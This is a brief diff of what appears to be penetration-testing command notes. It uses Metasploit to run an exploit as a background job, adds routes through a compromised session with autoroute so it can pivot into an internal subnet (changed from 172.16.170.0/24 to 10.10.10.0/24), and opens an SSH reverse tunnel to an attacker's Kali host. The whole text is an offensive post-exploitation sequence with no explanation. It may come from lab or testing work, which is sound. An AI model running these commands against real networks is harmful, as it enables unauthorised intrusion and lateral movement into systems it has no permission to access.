@@ -7,7 +7,7 @@ exploit -j
 run post/multi/manage/autoroute
 set session 1
 session => 1
-set subnet 172.16.170.0/24
+set subnet 10.10.10.0/24
 run
 
 ssh -Nf -R 7000:127.0.0.1:80 root@Kali IP Address
